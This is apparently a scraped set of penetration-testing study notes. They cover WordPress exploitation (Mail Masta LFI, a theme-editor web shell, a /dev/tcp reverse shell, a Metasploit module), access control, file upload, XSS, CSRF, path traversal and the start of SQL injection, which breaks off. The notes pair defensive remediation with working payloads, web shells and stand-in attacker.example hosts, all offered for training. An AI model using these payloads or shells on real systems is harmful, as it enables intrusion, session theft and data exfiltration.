<name>faultString</name><value><string>Incorrect username or password.</string></value>

docs.title: 6. Automating WordPress Enumeration with WPScan
docs.text: WPScan is the standard tool for WordPress security assessment. It can enumerate versions, users, plugins, themes, and known vulnerabilities.

docs.title: Installation
docs.text:
gem install wpscan

WPScan is usually preinstalled on Kali Linux and Parrot OS.

docs.title: Common WPScan Options
7. Exploiting Vulnerable Plugins: Mail Masta LFI
docs.text:
A common WordPress exploitation path is finding a vulnerable plugin and validating the vulnerability manually.

The Mail Masta plugin version 1.0 and below is vulnerable to unauthenticated Local File Inclusion.

Relevant vulnerability:

CVE-2016-10956

The issue exists because the plugin passes user-controlled input to a PHP include() call without proper validation.

Vulnerable path:

/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php

Vulnerable parameter:

?pl=

docs.title: Reading /etc/passwd
docs.text:
Browser PoC:

http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

cURL PoC:

curl "http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

Example output:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

This confirms file read access on the server.

docs.title: LFI to Sensitive File Disclosure
docs.text:
If PHP wrappers are allowed, the LFI may be used to read PHP source code by Base64-encoding the output.

Example target:

wp-config.php

Payload pattern:

?pl=php://filter/convert.base64-encode/resource=../../../../wp-config.php

This can expose database credentials, authentication salts, and other sensitive WordPress configuration values.

docs.title: LFI to RCE Concepts
docs.text:
An LFI may sometimes be escalated to Remote Code Execution if attacker-controlled content can be included as PHP.

Common escalation paths include:

Technique Idea Log poisoning Inject PHP into web logs and include the log file PHP filter wrappers Read source code and extract credentials Session poisoning Place payloads in session files and include them Uploaded file inclusion Upload a file and include it through the vulnerable parameter

These depend on server configuration, file permissions, and what files are readable through the LFI.

docs.title: 8. Authenticated WordPress RCE via Theme Editor
docs.text:
If an attacker gains administrator access to the WordPress dashboard, they may be able to execute code by editing PHP theme files.

WordPress includes a Theme Editor under:

Appearance > Theme Editor

This feature allows administrators to modify theme PHP files from the browser.

docs.title: Web Shell Through Theme Editor
docs.text:
A common approach is to edit a non-critical file in an inactive theme, such as 404.php.

Example PHP payload:

<?php system($_GET['cmd']); ?>

After saving the file, the payload can be triggered directly:

http://blog.inlanefreight.com/wp-content/themes/twentyseventeen/404.php?cmd=id

Using cURL:

curl "http://blog.inlanefreight.com/wp-content/themes/twentyseventeen/404.php?cmd=id"

Example output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

This confirms command execution as the web server user.

docs.title: Reverse Shell Upgrade
docs.text:
Once command execution is confirmed, the attacker may attempt to obtain an interactive shell.

Example Bash reverse shell payload:

bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'

The payload usually needs to be URL-encoded before being passed through a browser or cURL request.

docs.title: 9. Automating Authenticated Exploitation with Metasploit
docs.text:
Metasploit can automate WordPress exploitation when valid administrator credentials are available.

The common module is:

exploit/unix/webapp/wp_admin_shell_upload

This module logs in to WordPress, uploads a malicious plugin, triggers the payload, and opens a Meterpreter session.

docs.title: Example Metasploit Workflow
docs.text:
msfconsole
search wp_admin
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS blog.inlanefreight.com
set USERNAME admin
set PASSWORD Winter2020
set LHOST 10.10.16.8
run

Successful result:

[*] Authenticating with WordPress using admin:Winter2020...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Meterpreter session 1 opened

Verify the session user:

meterpreter > getuid
Server username: www-data (33)

docs.title: 10. WordPress Hardening
docs.text: WordPress hardening focuses on reducing attack surface, preventing credential attacks, and limiting post-authentication damage.

docs.title: Keep WordPress Updated
docs.text:
Outdated WordPress core, plugins, and themes are a major source of compromise.

Automatic updates can be enabled in wp-config.php:

define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );

docs.title: Disable File Editing
docs.text:
To prevent dashboard-based RCE through the Theme Editor or Plugin Editor, add this to wp-config.php:

define( 'DISALLOW_FILE_EDIT', true );

docs.title: Remove Inactive Plugins and Themes
docs.text: Deactivated plugins can still expose vulnerable files. Delete unused plugins and themes entirely.

docs.title: Protect Authentication
docs.text:
Recommended controls:

  • Do not use the default admin username
  • Enforce strong passwords
  • Enable multi-factor authentication
  • Rate-limit login attempts
  • Restrict access to /wp-login.php
  • Disable or restrict xmlrpc.php if not required

docs.title: Reduce Enumeration
docs.text:
Recommended controls:

  • Disable public user enumeration through the REST API
  • Block ?author= redirects
  • Remove version disclosure from source code
  • Disable directory indexing
  • Restrict access to plugin and theme directories where possible

docs.title: Use Security Plugins Carefully
docs.text:
Security plugins can add monitoring, firewall rules, and malware scanning.

Plugin Useful Features Wordfence WAF, malware scanning, login rate limiting Sucuri Security File integrity monitoring, blacklist checks, auditing iThemes Security 2FA, login protection, configuration hardening

Security plugins are helpful, but they do not replace patching, least privilege, or proper server configuration.

docs.title: 11. Quick Reference
docs.text: Objective Command / Path Check generator tag curl -s <url> \| grep generator Find plugins grep 'wp-content/plugins/' Find themes grep 'wp-content/themes/' Check plugin directory curl -I <url>/wp-content/plugins/<plugin> Author enumeration /?author=1 REST API users /wp-json/wp/v2/users XML-RPC endpoint /xmlrpc.php WordPress login /wp-login.php WPScan users/plugins wpscan --url <url> -e u,ap Mail Masta LFI count_of_send.php?pl=/etc/passwd Disable file editing define( 'DISALLOW_FILE_EDIT', true );

docs.title: Access Control
docs.text:
Access control, also called authorization, determines what an authenticated user is allowed to access or perform inside an application.

Broken access control happens when an application fails to properly enforce these rules. This can allow users to access other users' data, administrative functions, internal resources, or actions outside their assigned permissions.

Warning

Test access control only in authorized labs, bug bounty scopes, or systems where you have explicit permission.

docs.title: Core Concepts
docs.text:
Access control depends on three related security areas.

Concept Question Answered Example Authentication Who are you? Login with username and password Session management Are you the same user who logged in? Session cookie Access control Are you allowed to do this? Admin-only delete function

Access control checks should happen on the server side for every sensitive action.

docs.title: Why Access Control Fails
docs.text:
Access control issues often happen because developers assume users will only interact with the application through the intended interface.

Common bad assumptions:

  • Users will not manually browse to hidden URLs.
  • Users will not change IDs in requests.
  • Hidden form fields cannot be modified.
  • Cookies cannot be edited.
  • JavaScript access checks are enough.
  • If a button is hidden, the action is protected.
  • Complex URLs are unguessable enough to be safe.

These assumptions are unsafe because attackers can intercept, modify, and replay HTTP requests.

docs.title: Vertical Privilege Escalation
docs.text:
Vertical privilege escalation occurs when a lower-privileged user gains access to higher-privileged functionality.

Example:

Standard user -> Admin functionality

Common targets:

  • Admin panels
  • User management
  • Billing settings
  • API key generation
  • Debug consoles
  • Internal dashboards
  • Delete or modify user functions

docs.title: Unprotected Functionality
docs.text:
Sometimes sensitive functionality is accessible directly if the user knows the URL.

Example:

GET /admin HTTP/1.1
Host: vulnerable.example

Or:

GET /admin/delete-user?id=12 HTTP/1.1
Host: vulnerable.example

If the server does not check whether the current user is an admin, hiding the link in the UI does not protect it.

docs.title: Testing Idea
docs.text:
Try directly requesting sensitive-looking paths:

/admin
/administrator
/admin-panel
/manage
/dashboard
/internal
/debug

docs.title: Information Leakage
docs.text:
Applications may leak hidden admin paths in places users can access.

Common sources:

  • HTML comments
  • JavaScript files
  • API responses
  • robots.txt
  • Sitemap files
  • Error messages
  • Frontend route definitions

Example robots.txt:

User-agent: *
Disallow: /administrator-panel

This prevents search engines from indexing the path, but it also reveals the path to anyone who reads the file.

docs.title: Security by Obscurity
docs.text:
A hidden or random-looking URL is not enough.

Example:

/administrator-panel-yb556

This may seem hard to guess, but it is still insecure if:

  • The URL appears in JavaScript
  • The URL appears in page source
  • The URL appears in logs
  • The URL is shared with all users
  • The server does not enforce authorization

The rule is simple:

Hidden path != protected path

docs.title: Parameter-Based Access Control
docs.text:
Some applications trust request parameters, cookies, or hidden fields to determine privileges.

Bad examples:

GET /home.jsp?admin=false HTTP/1.1

Cookie: role=user

<input type="hidden" name="isAdmin" value="false">

An attacker can modify these values:

GET /home.jsp?admin=true HTTP/1.1

Cookie: role=admin

Access control decisions should not trust user-controlled input.

docs.title: Horizontal Privilege Escalation
docs.text:
Horizontal privilege escalation occurs when a user accesses another user's resources without gaining higher privileges.

Example:

User A -> User B's account data

This is commonly caused by IDOR vulnerabilities.

docs.title: IDOR
docs.text:
IDOR stands for Insecure Direct Object Reference.

It happens when an application exposes a direct reference to an object, such as a user ID, file ID, invoice ID, or order ID, without checking whether the current user is allowed to access it.

Example:

GET /my-account?id=123 HTTP/1.1
Host: vulnerable.example
Cookie: session=user-a

The attacker changes the ID:

GET /my-account?id=456 HTTP/1.1
Host: vulnerable.example
Cookie: session=user-a

If the application returns user 456's account data, access control is broken.

docs.title: Common IDOR Targets
docs.text:
Look for object identifiers in:

  • URL paths
  • Query parameters
  • JSON bodies
  • Form fields
  • Cookies
  • API routes
  • File download links

Examples:

/user/123
/account?id=123
/api/users/123
/download?fileId=123
/order/9001
/invoice?id=INV-1001

docs.title: GUIDs and UUIDs
docs.text:
Some applications use GUIDs or UUIDs instead of sequential IDs.

Example:

/api/users/8f14e45f-ea3f-42c0-a5d5-123456789abc

This is harder to guess than 123, but it is not automatically secure.

GUID-based access control can still fail if:

  • GUIDs are leaked in public pages
  • GUIDs appear in JavaScript
  • GUIDs appear in API responses
  • GUIDs are predictable
  • The application still does not verify ownership

docs.title: Horizontal to Vertical Escalation
docs.text:
Attackers can sometimes chain horizontal access into vertical escalation.

Example attack path:

  1. A normal user finds an IDOR in account settings.
  2. The user changes id=123 to id=456.
  3. User 456 is an administrator.
  4. The attacker accesses the admin user's account settings.
  5. The attacker changes the admin email or resets credentials.
  6. The attacker gains administrative access.

This chain starts as horizontal privilege escalation and becomes vertical privilege escalation.

docs.title: Testing Checklist
docs.text:
When testing access control, ask:

  • Can a normal user access admin URLs directly?
  • Are hidden URLs leaked in source code?
  • Can IDs be changed to access other users' data?
  • Are authorization checks enforced server-side?
  • Can cookies or parameters change user role?
  • Can lower-privileged users call privileged API endpoints?
  • Can users modify or delete objects they do not own?
  • Are different HTTP methods protected consistently?
  • Are GUIDs or UUIDs leaked anywhere?
  • Are API responses exposing more data than the UI shows?

docs.title: Remediation
docs.text:
Strong access control should be enforced consistently on the server side.

Good practices:

  • Deny access by default.
  • Check authorization on every sensitive request.
  • Do not rely on hidden buttons or hidden URLs.
  • Do not trust user-controlled role values.
  • Use server-side session identity.
  • Verify object ownership before access.
  • Use centralized authorization logic.
  • Log access control violations.
  • Test with multiple user roles.
  • Apply least privilege.

Example rule:

Before returning invoice 123,
verify that the current user owns invoice 123
or has an authorized role to view it.

docs.title: Quick Reference
docs.text: Issue Example Impact Unprotected admin route /admin accessible to normal user Vertical escalation IDOR Change user_id=1 to user_id=2 Horizontal escalation Role parameter trust admin=false changed to admin=true Vertical escalation Leaked admin URL Path exposed in JavaScript Admin function discovery GUID leakage User UUID exposed publicly IDOR despite unguessable IDs

docs.title: Notes to Remember
docs.text:
• Authentication proves identity.
  • Session management tracks identity.
  • Access control decides permissions.
  • Access control must be enforced server-side.
  • Hidden links are not security.
  • User-controlled parameters must not define privileges.
  • IDOR is one of the most common access control flaws.
  • GUIDs help prevent guessing but do not replace authorization.

docs.title: File Upload Vulnerabilities
docs.text:
File upload vulnerabilities occur when an application allows users to upload files without properly validating the file name, type, content, size, or storage location.

A vulnerable upload feature can lead to information disclosure, stored XSS, denial of service, file overwrite, or remote code execution.

Warning

Test file upload behavior only in authorized labs or approved assessment scopes.

docs.title: Overview
docs.text:
File upload features are common in web applications.

Examples:

  • Profile pictures
  • PDF uploads
  • Resume uploads
  • Support ticket attachments
  • Image galleries
  • Document management systems
  • Import features

A file upload is risky because the application accepts attacker-controlled content and stores it on the server.

docs.title: What Can Go Wrong
docs.text:
A secure upload feature must control several things.

Check Risk if Missing File extension Executable scripts may be uploaded MIME type Client-controlled type may be trusted File contents Non-image files may be disguised as images File size Large uploads may cause denial of service File name Path traversal or overwrite risk Storage path Uploaded files may be executable Permissions Uploaded files may be run by the server

docs.title: Dangerous File Types
docs.text:
Dangerous extensions depend on the server technology.

Technology Dangerous Extensions PHP .php, .php5, .phtml ASP.NET .aspx, .ashx, .asmx Java .jsp, .jspx Python .py in some configurations Server config .htaccess, web.config

Safe upload handling depends on the server configuration. An extension that is harmless on one server may be executable on another.

docs.title: Web Shells
docs.text:
A web shell is a server-side script that allows command execution or file interaction through HTTP requests.

If an attacker uploads a script and the server executes it, the impact can be severe.

Possible impact:

  • Read files
  • Modify files
  • Delete files
  • Execute commands
  • Exfiltrate secrets
  • Access databases
  • Pivot further into internal systems

docs.title: Simple PHP Web Shell Examples
docs.text:
A file-read example:

<?php echo file_get_contents('/path/to/target/file'); ?>

A command-execution example:

<?php echo system($_GET['command']); ?>

Example request to trigger it in a lab:

GET /uploads/shell.php?command=id HTTP/1.1
Host: vulnerable.example

Danger

A web shell can give an attacker control over the web server process. Never upload or execute web shells outside authorized lab environments.

docs.title: Extension Validation Bypass
docs.text:
Some applications block obvious extensions but allow alternative executable extensions.

Examples:

shell.php
shell.php5
shell.phtml
shell.phar

If only .php is blocked, another extension may still execute depending on server configuration.

docs.title: MIME Type Bypass
docs.text:
Applications may trust the Content-Type header.

Example:

Content-Type: image/png

But this header is controlled by the client and can be modified.

A malicious upload may claim to be an image while containing script content.

docs.title: Magic Bytes and File Content
docs.text:
Some applications check the first bytes of a file.

Examples:

File Type Common Magic Bytes PNG 89 50 4E 47 JPEG FF D8 FF GIF 47 49 46 38 PDF %PDF

Attackers may try to create polyglot files that satisfy weak content checks while still containing executable content.

docs.title: File Name Issues
docs.text:
Unsafe file names can create additional vulnerabilities.

Examples:

../../../shell.php
../../../../var/www/html/shell.php
avatar.php
avatar.php%00.png
avatar.jpg.php

Risks:

  • Path traversal
  • File overwrite
  • Extension confusion
  • Null byte bypass in legacy systems
  • Special character issues
  • Predictable file paths

docs.title: Upload Location
docs.text:
Even if an application accepts a dangerous file, it may not be exploitable unless the attacker can access or execute it.

Important questions:

  • Where is the file stored?
  • Is the upload directory web-accessible?
  • Does the server execute scripts there?
  • Are uploaded files renamed?
  • Are permissions restricted?
  • Is the file served from a separate domain or static storage?

Safer pattern:

Uploads stored outside web root
Files served through controlled download handler
Scripts disabled in upload directory
Randomized server-side file names

docs.title: Common Testing Workflow
docs.text:
1. Upload a normal allowed file.
  2. Observe the request and response.
  3. Identify where the file is stored.
  4. Check whether the file is accessible.
  5. Test extension restrictions.
  6. Test MIME type validation.
  7. Test file content validation.
  8. Test file name handling.
  9. Test size limits.
  10. Confirm impact safely.

Example normal upload request:

POST /upload HTTP/1.1
Host: vulnerable.example
Content-Type: multipart/form-data; boundary=----Boundary123

------Boundary123
Content-Disposition: form-data; name="file"; filename="avatar.png"
Content-Type: image/png

[image data]
------Boundary123--

docs.title: Remediation
docs.text:
Secure file upload handling should use multiple controls.

Recommended defenses:

  • Allowlist safe extensions.
  • Validate file contents, not just extension.
  • Rename files server-side.
  • Store files outside the web root.
  • Disable script execution in upload directories.
  • Enforce file size limits.
  • Strip dangerous metadata where appropriate.
  • Use random file names.
  • Do not trust client-supplied MIME types.
  • Scan uploads for malware when appropriate.
  • Serve files with safe Content-Type.
  • Add Content-Disposition: attachment for downloads when needed.
  • Apply authorization checks before file access.

docs.title: Safer Upload Rules
docs.text:
Example safer approach:

Accept only .jpg, .png, .pdf
Verify file signature
Rename to random UUID
Store outside web root
Record metadata in database
Serve through authenticated download route
Disable execution permissions

docs.title: Quick Reference
docs.text: Issue Example Impact Executable upload shell.php Remote code execution MIME trust Content-Type: image/png Filter bypass Weak extension block .phtml allowed Script execution Path traversal filename ../../../file File overwrite or write outside directory Large upload Huge file Denial of service Public upload directory /uploads/file.php Direct execution

docs.title: Notes to Remember
docs.text:
• File uploads are dangerous because they store attacker-controlled content.
  • Extension checks alone are not enough.
  • MIME type is client-controlled.
  • Uploaded files should not execute as code.
  • Store uploads outside the web root when possible.
  • Rename files on the server.
  • Validate file content and enforce size limits.
  • Web shells can lead to remote code execution.

docs.title: Front-End Vulnerabilities
docs.text:
Front-end vulnerabilities occur when insecure client-side code, unsafe rendering, or poor input handling allows attackers to expose sensitive data, alter page content, or execute malicious JavaScript in a victim's browser.

Because HTML, CSS, and JavaScript are delivered to the user's browser, attackers can inspect and manipulate them directly. Anything sent to the client should be treated as visible and controllable by the user.

docs.title: Sensitive Data Exposure
docs.text:
Sensitive data exposure happens when private information is accidentally included in front-end code.

This can include:

  • Developer comments
  • Test credentials
  • Hardcoded API keys
  • Hidden form values
  • Internal endpoints
  • Debugging information
  • Backup paths
  • Hashes or tokens
  • Internal directory names

docs.title: Client-Side Visibility
docs.text:
Front-end code runs in the user's browser. This means users can inspect:

  • HTML source
  • JavaScript files
  • CSS files
  • Network requests
  • API responses
  • Hidden form fields
  • Browser storage

A common mistake is assuming that hidden content is secure because it is not visible in the page interface.

Example:

<input type="hidden" name="role" value="admin">

This field may not be visible on the page, but it is still visible and editable in browser developer tools or an intercepting proxy.

docs.title: Investigating Page Source
docs.text:
Pentesters commonly inspect page source during web reconnaissance.

Useful methods include:

Method Purpose View Page Source Inspect raw HTML Browser Developer Tools Inspect DOM, storage, scripts, and requests Burp Suite Intercept and modify requests cURL Retrieve source from the command line

Example:

curl -s https://example.com

docs.title: High-Value Items in Source Code
docs.text:
Important findings may include:

Item Risk Comments May reveal developer notes, credentials, or hidden routes JavaScript files May contain API routes, keys, or business logic Hidden fields May expose role, price, or permission values Internal links May reveal admin panels or backup directories API keys May allow abuse of third-party services Debug data May reveal stack traces, paths, or framework details

docs.title: HTML Injection
docs.text:
HTML injection occurs when an application inserts user-controlled input into a page without proper encoding or sanitization.

The browser interprets the injected input as HTML instead of plain text.

docs.title: How HTML Injection Works
docs.text:
A vulnerable application may take user input and insert it directly into the DOM using .innerHTML.

Example vulnerable JavaScript:

function inputFunction() {
    var input = prompt("Please enter your name", "");
    if (input != null) {
        document.getElementById("output").innerHTML = "Your name is " + input;
    }
}

If the user enters:

<h1>Injected Heading</h1>

The browser renders it as an actual heading.

docs.title: HTML Injection Impact
docs.text:
HTML injection can be used for:

  • Web page defacement
  • Fake login forms
  • Phishing prompts
  • UI manipulation
  • Brand damage
  • Social engineering

Example phishing-style payload:

<form action="https://attacker.example/steal">
  <label>Session expired. Login again:</label>
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Login">
</form>

docs.title: HTML Injection Prevention
docs.text:
Defenses include:

Defense Description Output encoding Convert special characters into HTML entities .textContent Render user input as text instead of HTML Input validation Accept only expected input patterns Sanitization Remove unsafe tags and attributes Content Security Policy Restrict what the browser can execute or load

Safer JavaScript example:

document.getElementById("output").textContent = "Your name is " + input;

docs.title: Cross-Site Scripting
docs.text:
Cross-Site Scripting, or XSS, occurs when an attacker causes malicious JavaScript to execute in another user's browser.

XSS is more dangerous than basic HTML injection because JavaScript can interact with the page, access sensitive browser data, and perform actions as the victim.

docs.title: Main Types of XSS
docs.text: Type Description Common Vector Reflected XSS Payload is reflected in a single response Malicious URL Stored XSS Payload is stored by the application and shown to other users Comments, profiles, posts DOM XSS Vulnerability exists in client-side JavaScript Unsafe DOM manipulation

docs.title: Reflected XSS
docs.text:
Reflected XSS occurs when user input is immediately returned in the server response.

Example:

https://example.com/search?q=<script>alert(1)</script>

If the application places the value of q into the page without encoding, the browser may execute it.

docs.title: Stored XSS
docs.text:
Stored XSS occurs when the payload is saved by the application and later displayed to other users.

Common locations include:

  • Blog comments
  • Forum posts
  • Profile bios
  • Ticket descriptions
  • Chat messages
  • Product reviews

Stored XSS is often more severe because one payload can affect many users.

docs.title: DOM XSS
docs.text:
DOM XSS occurs when vulnerable JavaScript reads attacker-controlled input and writes it into the page unsafely.

Common unsafe sources include:

  • location.search
  • location.hash
  • document.referrer
  • window.name
  • Browser storage

Common unsafe sinks include:

  • innerHTML
  • outerHTML
  • document.write()
  • eval()

docs.title: XSS Payload Anatomy
docs.text:
Example payload:

#"><img src=/ onerror=alert(document.cookie)>

Payload breakdown:

Part Purpose #"> Attempts to break out of an existing context <img src=/> Creates an image element with an invalid source onerror= Runs JavaScript when image loading fails alert(document.cookie) Attempts to access cookies

docs.title: XSS Impact
docs.text:
XSS can allow an attacker to:

  • Steal session cookies
  • Hijack user sessions
  • Capture keystrokes
  • Redirect users to malicious pages
  • Modify page content
  • Perform actions as the victim
  • Deliver phishing prompts
  • Attack administrators through stored payloads

docs.title: XSS Prevention
docs.text:
Effective XSS prevention requires defense in depth.

Defense Description Output encoding Encode special characters before rendering Input validation Only accept expected input Safe DOM APIs Use .textContent instead of .innerHTML Sanitization Remove unsafe HTML using trusted libraries HttpOnly cookies Prevent JavaScript from reading session cookies Content Security Policy Restrict script execution sources

Important cookie flags:

Flag Purpose HttpOnly Prevents JavaScript from reading the cookie Secure Sends cookie only over HTTPS SameSite Controls whether cookies are sent with cross-site requests

docs.title: Cross-Site Request Forgery
docs.text:
Cross-Site Request Forgery, or CSRF, tricks a victim's browser into sending an unwanted request to a site where the victim is already authenticated.

XSS abuses the user's trust in a website. CSRF abuses the website's trust in the user's browser.

docs.title: How CSRF Works
docs.text:
CSRF relies on the browser automatically including cookies with requests.

Attack flow:

  • The victim logs in to a legitimate application.
  • The application stores a session cookie in the browser.
  • The victim visits an attacker-controlled page.
  • The attacker page causes the browser to send a request to the legitimate application.
  • The browser automatically includes the victim's session cookie.
  • The application processes the request as if the victim intended it.

docs.title: CSRF Requirements
docs.text:
A CSRF attack usually requires:

Requirement Description Relevant action The target action changes data or performs a sensitive operation Cookie-based sessions The browser automatically includes authentication cookies Predictable request The attacker can guess or construct all required parameters Missing CSRF token No unpredictable anti-CSRF value is required

docs.title: CSRF Example
docs.text:
A malicious page could include a hidden request:

<img src="https://bank.example/transfer?to=attacker&amount=1000">

If the victim is authenticated and the application accepts state-changing GET requests, the browser may submit the request with the victim's cookies.

docs.title: CSRF via XSS
docs.text:
Stored XSS can be used to deliver CSRF payloads from inside the trusted application itself.

Example:

<script src="https://attacker.example/exploit.js"></script>

The external script could send a background request:

fetch("https://target.example/api/password-change", {
  method: "POST",
  body: "new_password=Changed123!",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
});

docs.title: CSRF Prevention
docs.text:
Defenses include:

Defense Description Anti-CSRF tokens Require unpredictable tokens on sensitive requests SameSite cookies Limit when cookies are sent cross-site Re-authentication Require password confirmation for sensitive actions MFA for critical actions Require additional approval Avoid state-changing GET requests Use POST/PUT/DELETE for actions that modify data

docs.title: SameSite Cookie Attribute
docs.text:
The SameSite attribute controls when cookies are sent with cross-site requests.

Value Behavior Strict Cookies are only sent for same-site requests Lax Cookies are withheld for most cross-site subrequests but sent on top-level navigation None Cookies are sent cross-site, but must also use Secure

docs.title: Sanitization vs. Validation
docs.text:
Sanitization and validation are related but not the same.

Control Purpose Example Validation Checks whether input matches the expected format A ZIP code must be five digits Sanitization Removes or transforms unsafe content Convert < to <

Strong applications use both.

docs.title: Front-End Security Checklist
docs.text:
Use this checklist when reviewing front-end code:

  • Search source code for comments and secrets.
  • Review JavaScript files for hidden endpoints and API keys.
  • Check whether client-side validation can be bypassed.
  • Inspect hidden fields and browser storage.
  • Test whether input is rendered with .innerHTML.
  • Check for reflected, stored, and DOM-based XSS.
  • Verify cookies use HttpOnly, Secure, and SameSite.
  • Confirm sensitive actions require CSRF protection.
  • Ensure the application does not rely on front-end logic for authorization.

docs.title: Path Traversal
docs.text:
Path traversal, also called directory traversal, is a vulnerability that allows an attacker to access files outside the intended directory.

It happens when an application uses user-controlled input to build a file path without proper validation.

Warning

Test path traversal only in authorized environments.

docs.title: Overview
docs.text:
Path traversal is commonly found in features that read files from the server.

Examples:

  • Image loading
  • File downloads
  • Report viewing
  • Template loading
  • Language selection
  • Document preview
  • Static file retrieval

A vulnerable request may look like this:

GET /loadImage?filename=218.png HTTP/1.1
Host: vulnerable.example

The server may build a file path like this:

/var/www/images/218.png

If the application trusts the filename parameter, an attacker may be able to escape the intended directory.

docs.title: Dot-Dot-Slash
docs.text:
The sequence ../ means “go up one directory.”

Example payload:

../../../etc/passwd

If the application appends user input to a base directory:

Base directory: /var/www/images/
User input:     ../../../etc/passwd
Final path:     /var/www/images/../../../etc/passwd
Resolved path:  /etc/passwd

The attacker has escaped the image directory and reached a system file.

docs.title: Linux Targets
docs.text:
Linux and Unix systems use / as the directory separator.

Common proof-of-concept files:

File Purpose /etc/passwd User account information /etc/hosts Local host mappings /proc/self/environ Process environment variables /var/log/apache2/access.log Apache access logs /var/www/html/index.php Possible web source file

Example:

GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable.example

docs.title: Windows Targets
docs.text:
Windows supports both backslash and forward slash in many contexts.

Common proof-of-concept files:

File Purpose C:\Windows\win.ini Classic Windows proof of concept C:\Windows\System32\drivers\etc\hosts Local host mappings C:\boot.ini Older Windows boot configuration

Example payloads:

..\..\..\windows\win.ini
../../../windows/win.ini

docs.title: Common Payloads
docs.text:
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd

Windows examples:

..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
../../../windows/win.ini

docs.title: Encoding Bypasses
docs.text:
Applications may block obvious traversal strings like ../.

Encoding can sometimes bypass weak filters.

Payload Meaning %2e%2e%2f URL-encoded ../ %2e%2e/ Partially encoded ../ ..%2f Encoded slash ..%5c Encoded backslash %252e%252e%252f Double-encoded ../

Example:

GET /loadImage?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: vulnerable.example

docs.title: Forced Extension Bypass
docs.text:
Some applications append a required extension.

Example backend logic:

filename + ".png"

A payload like this:

../../../etc/passwd

becomes:

../../../etc/passwd.png

In older or misconfigured systems, null byte injection may terminate the string early:

../../../etc/passwd%00

Result:

../../../etc/passwd%00.png

The .png part may be ignored in vulnerable legacy environments.

Note

Null byte injection is mostly relevant to older systems, but it is useful to understand historically and in labs.

docs.title: Filter Bypass Patterns
docs.text:
Weak filters often remove traversal sequences only once.

Example filter:

Remove "../" from input

Payload:

....//....//....//etc/passwd

After one filter pass, this may collapse into:

../../../etc/passwd

Other bypass ideas:

....\/....\/etc/passwd
..../..../etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

docs.title: Impact
docs.text:
Path traversal can expose sensitive files.

Possible impact:

  • Source code disclosure
  • Configuration file disclosure
  • Credential leakage
  • API key leakage
  • Log file access
  • User enumeration
  • Application secret exposure
  • Further exploitation through file write or log poisoning in some cases

Sensitive application files may include:

.env
config.php
settings.py
web.config
application.yml
database.yml

docs.title: Testing Checklist
docs.text:
Check parameters related to files or paths:

filename=
file=
path=
page=
template=
lang=
download=
document=
image=

Testing steps:

  1. Identify a parameter that loads a file.
  2. Try a normal valid file.
  3. Add ../ sequences.
  4. Try known Linux or Windows files.
  5. Try encoded traversal.
  6. Try absolute paths.
  7. Check whether errors reveal the final path.
  8. Test whether the application appends extensions.
  9. Confirm impact without damaging the system.

docs.title: Remediation
docs.text:
Safe file handling should avoid direct user-controlled paths.

Recommended defenses:

  • Avoid passing file paths directly.
  • Use indirect file IDs mapped server-side.
  • Store allowed files in a database or allowlist.
  • Normalize and canonicalize paths before access.
  • Verify the resolved path stays inside the intended base directory.
  • Reject path separators and traversal sequences.
  • Apply strict allowlists for file names and extensions.
  • Run the application with least-privilege filesystem access.

Example secure logic:

User requests file ID 123
Server looks up file ID 123 in database
Server resolves safe known path
Server verifies user is allowed to access it
Server returns the file

docs.title: Quick Reference
docs.text: Target Payload Linux users ../../../../etc/passwd Linux hosts file ../../../../etc/hosts Windows proof ..\..\..\windows\win.ini Encoded traversal ..%2f..%2f..%2fetc%2fpasswd Extension bypass ../../../etc/passwd%00 Filter bypass ....//....//etc/passwd

docs.title: Notes to Remember
docs.text:
• Path traversal abuses unsafe file path construction.
  • ../ moves up one directory.
  • Linux uses /; Windows often accepts \ and /.
  • Encoding can bypass weak filters.
  • Never trust user-supplied file paths.
  • Canonicalize paths before validating them.
  • File IDs are safer than raw file names.

docs.title: SQL Injection
docs.text:
SQL injection, or SQLi, is a web vulnerability that allows an attacker to interfere with the database queries an application makes.

It usually happens when user input is inserted into SQL queries without safe handling. This can allow attackers to bypass authentication, read sensitive data, modify records, or in severe cases interact with the underlying server.

Warning

Test SQL injection only in authorized labs, bug bounty scopes, or approved assessments.

docs.title: Overview
docs.text:
Web applications often use databases to store:

  • User accounts
  • Password hashes
  • Sessions
  • Orders
  • Messages
  • Products
  • Permissions
  • Logs
  • Application settings

Applications communicate with relational databases using SQL.

Example query:

SELECT *
FROM users
WHERE username = 'alice';

SQL injection happens when attacker-controlled input changes the intended query logic.

docs.title: How Web Apps Use SQL
docs.text:
A login form might accept:

Username: John
Password: Un@detectable444

The application may build a query:

SELECT *
FROM users
WHERE username = 'John'
AND password = 'Un@detectable444';

If a matching row exists, the application logs the user in.

The problem appears when input is concatenated directly into the query instead of being handled safely.

docs.title: Authentication Bypass Example
docs.text:
Attacker input:

Username: John
Password: abc' OR 1=1;-- -

Possible resulting query:

SELECT *
FROM users
WHERE username = 'John'
AND password = 'abc' OR 1=1;-- -';

Why this works in vulnerable logic:

Part Purpose ' Closes the original string OR 1=1 Adds a condition that is always true -- - Comments out the rest of the query

The database may return a valid row because 1=1 is always true.

docs.title: Common SQLi Indicators
docs.text:
SQL injection may be present when input causes database errors or changes behavior unexpectedly.

Signs to look for:

  • SQL error messages
  • Different responses after adding '
  • Login bypass behavior
